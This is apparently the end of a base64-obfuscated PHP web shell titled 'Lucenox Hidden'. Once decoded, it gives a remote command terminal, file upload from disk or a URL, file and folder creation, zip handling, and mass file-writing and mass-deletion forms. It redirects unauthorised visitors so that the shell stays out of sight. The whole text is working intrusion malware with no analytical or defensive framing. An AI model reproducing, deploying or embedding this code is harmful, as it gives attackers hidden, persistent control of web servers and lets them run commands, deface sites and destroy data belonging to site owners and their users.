udGVyOwogICAgICAgIGZvbnQtc2l6ZTogMnJlbTsKICAgICAgICBib3JkZXItYm90dG9tOiAycHggc29saWQgIzQ0NDsKICAgICAgICBwYWRkaW5nLWJvdHRvbTogMTBweDsKICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgfQoKICAgICAgLmZpdHVyLWJ1dHRvbnMgewogICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgZ2FwOiAxMHB4OwogICAgICAgIG1hcmdpbi1ib3R0b206IDIwcHg7CiAgICAgICAgZmxleC13cmFwOiB3cmFwOwogICAgICB9CgogICAgICAuZml0dXItYnV0dG9ucyBidXR0b24gewogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmZmFmNDA7CiAgICAgICAgY29sb3I6ICMxYTFjMWY7CiAgICAgICAgcGFkZGluZzogMTJweCAyMHB4OwogICAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgICBib3JkZXItcmFkaXVzOiA2cHg7CiAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zcywgdHJhbnNmb3JtIDAuM3M7CiAgICAgICAgZm9udC1zaXplOiAwLjlyZW07CiAgICAgICAgYm94LXNoYWRvdzogMCAycHggNXB4IHJnYmEoMCwgMCwgMCwgMC4zKTsKICAgICAgfQoKICAgICAgLmZpdHVyLWJ1dHRvbnMgYnV0dG9uOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTY5YzM2OwogICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtMnB4KTsKICAgICAgfQoKICAgICAgLmZpdHVyLWZvcm0gewogICAgICAgIGRpc3BsYXk6IG5vbmU7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzNiM2Y0NTsKICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgICAgICBib3gtc2hhZG93OiAwIDRweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC4zKTsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgIG1heC13aWR0aDogNjAwcHg7CiAgICAgIH0KCiAgICAgIGlucHV0LAogICAgICB0ZXh0YXJlYSB7CiAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgcGFkZGluZzogMTJweDsKICAgICAgICBtYXJnaW4tdG9wOiAxMHB4OwogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMyZDMwMzU7CiAgICAgICAgY29sb3I6ICNmZmZmZmY7CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzQ0NDc0YjsKICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7CiAgICAgICAgdHJhbnNpdGlvbjogYm9yZGVyLWNvbG9yIDAuMnM7CiAgICAgICAgZm9udC1zaXplOiAwLjlyZW07CiAgICAgIH0KCiAgICAgIGlucHV0OmZvY3VzLAogICAgICB0ZXh0YXJlYTpmb2N1cyB7CiAgICAgICAgYm9yZGVyLWNvbG9yOiAjZmZhZjQwOwogICAgICAgIG91dGxpbmU6IG5vbmU7CiAgICAgIH0KCiAgICAgIGJ1dHRvbi5zdWJtaXQtYnRuIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZhZjQwOwogICAgICAgIGNvbG9yOiAjMWExYzFmOwogICAgICAgIHBhZGRpbmc6IDEycHg7CiAgICAgICAgYm9yZGVyOiBub25lOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDZweDsKICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgICAgICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzLCB0cmFuc2Zvcm0gMC4zczsKICAgICAgICBmb250LXNpemU6IDFyZW07CiAgICAgIH0KCiAgICAgIGJ1dHRvbi5zdWJtaXQtYnRuOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTY5YzM2OwogICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtMnB4KTsKICAgICAgfQoKICAgICAgLnRlcm1pbmFsIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjUyNTI2OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgIG1heC13aWR0aDogNjAwcHg7CiAgICAgICAgYm94LXNoYWRvdzogMCA0cHggMTVweCByZ2JhKDAsIDAsIDAsIDAuNSk7CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgfQoKICAgICAgLnRlcm1pbmFsIGgzIHsKICAgICAgICBjb2xvcjogI2ZmYWY0MDsKICAgICAgICBmb250LXNpemU6IDEuMnJlbTsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxNXB4OwogICAgICAgIGJvcmRlci1ib3R0b206IDFweCBzb2xpZCAjMzMzOwogICAgICAgIHBhZGRpbmctYm90dG9tOiA1cHg7CiAgICAgIH0KCiAgICAgIC50ZXJtaW5hbCBpbnB1dFt0eXBlPSJ0ZXh0Il0gewogICAgICAgIHBhZGRpbmc6IDEwcHg7CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTVweDsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjNDQ0OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUxZTFlOwogICAgICAgIGNvbG9yOiAjZDRkNGQ0OwogICAgICAgIHRyYW5zaXRpb246IGJvcmRlci1jb2xvciAwLjNzOwogICAgICB9CgogICAgICAudGVybWluYWwgaW5wdXRbdHlwZT0idGV4dCJdOmZvY3VzIHsKICAgICAgICBib3JkZXItY29sb3I6ICNmZmFmNDA7CiAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgfQoKICAgICAgLnRlcm1pbmFsIGJ1dHRvbiB7CiAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNHB4OwogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmZmFmNDA7CiAgICAgICAgY29sb3I6ICMxZTFlMWU7CiAgICAgICAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zcywgdHJhbnNmb3JtIDAuMnM7CiAgICAgIH0KCiAgICAgIC50ZXJtaW5hbCBidXR0b246aG92ZXIgewogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmZjk4MDA7CiAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0ycHgpOwogICAgICB9CgogICAgICAub3V0cHV0IHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUxZTFlOwogICAgICAgIGNvbG9yOiAjMDBmZjAwOwogICAgICAgIHBhZGRpbmc6IDE1cHg7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNHB4OwogICAgICAgIG1hcmdpbi10b3A6IDIwcHg7CiAgICAgICAgZm9udC1zaXplOiAwLjlyZW07CiAgICAgICAgd2hpdGUtc3BhY2U6IHByZS13cmFwOwogICAgICAgIG92ZXJmbG93LXg6IGF1dG87CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICAgICAgfQogICAgPC9zdHlsZT4KICA8L2hlYWQ+CgogIDxib2R5PgogICAgPGgxPkx1Y2Vub3ggSGlkZGVuPC9oMT4KICAgIDxkaXYgY2xhc3M9InRlcm1pbmFsIj4KICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0Ij4KICAgICAgICA8aDM+Q29tbWFuZCBMaW5lPC9oMz4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idGVybWluYWxfY29tbWFuZCIgcGxhY2Vob2xkZXI9IkNvbW1hbmQiIHJlcXVpcmVkPgogICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5Db21tYW5kPC9idXR0b24+CiAgICAgIDwvZm9ybT4KICAgICAgPD9waHAgaWYgKCFlbXB0eSgkdGVybWluYWxfb3V0cHV0KSk6ID8+CiAgICAgICAgPHByZSBjbGFzcz0ib3V0cHV0Ij48Pz0gJHNwY2woJHRlcm1pbmFsX291dHB1dCk7ID8+PC9wcmU+CiAgICAgIDw/cGhwIGVuZGlmOyA/PgogICAgPC9kaXY+CiAgICA8P3BocCBpZiAoIWVtcHR5KCRvdXRwdXQpKTogPz4KICAgICAgPGRpdiBjbGFzcz0ib3V0cHV0Ij48Pz0gJG91dHB1dDsgPz48L2Rpdj4KICAgIDw/cGhwIGVuZGlmOyA/PgogICAgPGRpdiBjbGFzcz0iZml0dXItYnV0dG9ucyI+CiAgICAgIDxidXR0b24gb25jbGljaz0ic2hvd0Zvcm0oJ3VwbG9hZC1maWxlLWZvcm0nKSI+VXBsb2FkIEZpbGU8L2J1dHRvbj4KICAgICAgPGJ1dHRvbiBvbmNsaWNrPSJzaG93Rm9ybSgncmVtb3RlLXVwbG9hZC1mb3JtJykiPlJlbW90ZSBVcGxvYWQ8L2J1dHRvbj4KICAgICAgPGJ1dHRvbiBvbmNsaWNrPSJzaG93Rm9ybSgnbmV3LWZpbGUtZm9ybScpIj5OZXcgRmlsZTwvYnV0dG9uPgogICAgICA8YnV0dG9uIG9uY2xpY2s9InNob3dGb3JtKCduZXctZm9sZGVyLWZvcm0nKSI+TmV3IEZvbGRlcjwvYnV0dG9uPgogICAgICA8YnV0dG9uIG9uY2xpY2s9InNob3dGb3JtKCd6aXAtZm9sZGVyLWZvcm0nKSI+WmlwIEZvbGRlcjwvYnV0dG9uPgogICAgICA8YnV0dG9uIG9uY2xpY2s9InNob3dGb3JtKCd1bnppcC1maWxlLWZvcm0nKSI+VW56aXAgRmlsZTwvYnV0dG9uPgogICAgICA8YnV0dG9uIG9uY2xpY2s9InNob3dGb3JtKCdtYWRlZi1mb3JtJykiPk1hRGVGPC9idXR0b24+CiAgICAgIDxidXR0b24gb25jbGljaz0ic2hvd0Zvcm0oJ21hZGVsLWZvcm0nKSI+TWFEZUw8L2J1dHRvbj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iZml0dXItdGFtbWJhaGFuIj4KICAgICAgPGZvcm0gaWQ9InVwbG9hZC1maWxlLWZvcm0iIGNsYXNzPSJmaXR1ci1mb3JtIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgICAgIDxoMz5VcGxvYWQgRmlsZTwvaDM+CiAgICAgICAgPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVfdXBsb2FkIiByZXF1aXJlZD4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJzdWJtaXQtYnRuIiB0eXBlPSJzdWJtaXQiPlVwbG9hZDwvYnV0dG9uPgogICAgICA8L2Zvcm0+CiAgICAgIDxmb3JtIGlkPSJyZW1vdGUtdXBsb2FkLWZvcm0iIGNsYXNzPSJmaXR1ci1mb3JtIiBtZXRob2Q9InBvc3QiPgogICAgICAgIDxoMz5SZW1vdGUgVXBsb2FkPC9oMz4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icmVtb3RlX2ZpbGVfdXJsIiBwbGFjZWhvbGRlcj0iRmlsZSBVUkwiIHJlcXVpcmVkPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjdXN0b21fZmlsZV9uYW1lIiBwbGFjZWhvbGRlcj0iQ3VzdG9tIEZpbGUgTmFtZSAob3B0aW9uYWwpIj4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJzdWJtaXQtYnRuIiB0eXBlPSJzdWJtaXQiPlJlbW90ZSBVcGxvYWQ8L2J1dHRvbj4KICAgICAgPC9mb3JtPgogICAgICA8Zm9ybSBpZD0ibmV3LWZpbGUtZm9ybSIgY2xhc3M9ImZpdHVyLWZvcm0iIG1ldGhvZD0icG9zdCI+CiAgICAgICAgPGgzPkNyZWF0ZSBOZXcgRmlsZTwvaDM+CiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9Im5ld19maWxlX25hbWUiIHBsYWNlaG9sZGVyPSJGaWxlIE5hbWUiIHJlcXVpcmVkPgogICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJuZXdfZmlsZV9jb250ZW50IiBwbGFjZWhvbGRlcj0iRmlsZSBDb250ZW50IiByZXF1aXJlZD48L3RleHRhcmVhPgogICAgICAgIDxidXR0b24gY2xhc3M9InN1Ym1pdC1idG4iIHR5cGU9InN1Ym1pdCI+Q3JlYXRlIEZpbGU8L2J1dHRvbj4KICAgICAgPC9mb3JtPgogICAgICA8Zm9ybSBpZD0ibmV3LWZvbGRlci1mb3JtIiBjbGFzcz0iZml0dXItZm9ybSIgbWV0aG9kPSJwb3N0Ij4KICAgICAgICA8aDM+Q3JlYXRlIE5ldyBGb2xkZXI8L2gzPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJuZXdfZm9sZGVyX25hbWUiIHBsYWNlaG9sZGVyPSJGb2xkZXIgTmFtZSIgcmVxdWlyZWQ+CiAgICAgICAgPGJ1dHRvbiBjbGFzcz0ic3VibWl0LWJ0biIgdHlwZT0ic3VibWl0Ij5DcmVhdGUgRm9sZGVyPC9idXR0b24+CiAgICAgIDwvZm9ybT4KICAgICAgPGZvcm0gaWQ9InppcC1mb2xkZXItZm9ybSIgY2xhc3M9ImZpdHVyLWZvcm0iIG1ldGhvZD0icG9zdCI+CiAgICAgICAgPGgzPlppcCBGb2xkZXI8L2gzPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ6aXBfZm9sZGVyX3BhdGgiIHBsYWNlaG9sZGVyPSJGb2xkZXIgUGF0aCB0byBaaXAiIHJlcXVpcmVkPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ6aXBfZmlsZV9uYW1lIiBwbGFjZWhvbGRlcj0iWmlwIEZpbGUgTmFtZSIgcmVxdWlyZWQ+CiAgICAgICAgPGJ1dHRvbiBjbGFzcz0ic3VibWl0LWJ0biIgdHlwZT0ic3VibWl0Ij5DcmVhdGUgWmlwPC9idXR0b24+CiAgICAgIDwvZm9ybT4KICAgICAgPGZvcm0gaWQ9InVuemlwLWZpbGUtZm9ybSIgY2xhc3M9ImZpdHVyLWZvcm0iIG1ldGhvZD0icG9zdCI+CiAgICAgICAgPGgzPlVuemlwIEZpbGU8L2gzPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1enByZnJfcGF0aCIgcGxhY2Vob2xkZXI9IlpJUCBGaWxlIFBhdGgiIHJlcXVpcmVkPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1bnppcF9kZXN0aW5hdGlvbl9wYXRoIiBwbGFjZWhvbGRlcj0iRGVzdGluYXRpb24gUGF0aCIgcmVxdWlyZWQ+CiAgICAgICAgPGJ1dHRvbiBjbGFzcz0ic3VibWl0LWJ0biIgdHlwZT0ic3VibWl0Ij5VbnppcCBGaWxlPC9idXR0b24+CiAgICAgIDwvZm9ybT4KICAgICAgPGZvcm0gaWQ9Im1hZGVmLWZvcm0iIGNsYXNzPSJmaXR1ci1mb3JtIiBtZXRob2Q9InBvc3QiPgogICAgICAgIDxoMz5NYURlRjwvaDM+CiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZpbGVuYW1lIiBpZD0iZmlsZW5hbWUiIHBsYWNlaG9sZGVyPSJGaWxlIE5hbWUiIHJlcXVpcmVkPgogICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJmaWxlX2NvbnRlbnQiIGlkPSJmaWxlX2NvbnRlbnQiIHJvd3M9IjQiIHBsYWNlaG9sZGVyPSJGaWxlIENvbnRlbnQiIHJlcXVpcmVkPjwvdGV4dGFyZWE+CiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InRhcmdldF9wYXRoIiBpZD0idGFyZ2V0X3BhdGgiIHBsYWNlaG9sZGVyPSJUYXJnZXQgRGlyZWN0b3J5IFBhdGgiIHJlcXVpcmVkPgogICAgICAgIDxidXR0b24gY2xhc3M9InN1Ym1pdC1idG4iIHR5cGU9InN1Ym1pdCIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0ieGVhIj5DcmVhdGUhPC9idXR0b24+CiAgICAgIDwvZm9ybT4KICAgICAgPGZvcm0gaWQ9Im1hZGVsLWZvcm0iIGNsYXNzPSJmaXR1ci1mb3JtIiBtZXRob2Q9InBvc3QiPgogICAgICAgIDxoMz5NYURlTDwvaDM+CiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZpbGVfbmFtZSIgaWQ9ImZpbGVfbmFtZSIgcGxhY2Vob2xkZXI9IkZpbGUgTmFtZSB0byBEZWxldGUiIHJlcXVpcmVkPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ0YXJnZXRfcGF0aCIgaWQ9InRhcmdldF9wYXRoIiBwbGFjZWhvbGRlcj0iVGFyZ2V0IERpcmVjdG9yeSBQYXRoIiByZXF1aXJlZD4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJzdWJtaXQtYnRuIiB0eXBlPSJzdWJtaXQiIG5hbWU9ImFjdGlvbiIgdmFsdWU9InB1bSI+R2FzITwvYnV0dG9uPgogICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCiAgICA8c2NyaXB0PgogICAgICBmdW5jdGlvbiBzaG93Rm9ybShmb3JtSWQpIHsKICAgICAgICBjb25zdCBmb3JtcyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5maXR1ci1mb3JtJyk7CiAgICAgICAgZm9ybXMuZm9yRWFjaChmb3JtID0+IHsKICAgICAgICAgIGZvcm0uc3R5bGUuZGlzcGxheSA9ICdub25lJzsKICAgICAgICB9KTsKICAgICAgICBjb25zdCBzZWxlY3RlZEZvcm0gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChmb3JtSWQpOwogICAgICAgIGlmIChzZWxlY3RlZEZvcm0pIHsKICAgICAgICAgIHNlbGVjdGVkRm9ybS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsKICAgICAgICB9CiAgICAgIH0KICAgIDwvc2NyaXB0PgoKICA8L2JvZHk+CgogIDwvaHRtbD4KPD9waHAKfSBlbHNlIHsKICBlY2hvICc8c2NyaXB0PndpbmRvdy5sb2NhdGlvbi5ocmVmID0gIicgLiAkZG9tYWluVXJsIC4gJyI7PC9zY3JpcHQ+JzsKICBlY2hvICc8c2NyaXB0PndpbmRvdy5sb2NhdGlvbi5ocmVmID0gIicgLiAkZG9tYWluVXJsIC4gJyI7PC9zY3JpcHQ+JzsKfQo/Pg=='));
?>
